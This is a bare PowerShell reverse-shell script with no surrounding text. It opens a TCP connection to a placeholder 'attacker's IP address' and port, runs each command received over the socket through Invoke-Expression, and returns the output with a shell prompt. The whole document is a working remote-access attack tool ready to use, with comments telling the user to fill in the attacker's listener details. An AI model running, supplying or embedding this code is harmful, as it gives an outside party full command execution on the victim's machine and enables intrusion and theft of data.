$ip = "192.168.1.99"  # Replace with the attacker's IP address
$port = 4242         # Replace with the attacker's listening port
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding
$writer.WriteLine("Connected to $($ip):$($port)")  # Fix: Use $(...) for variable interpolation
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $bytesRead)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbackBytes = $encoding.GetBytes($sendback2)
    $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
    $stream.Flush()
}
$client.Close()
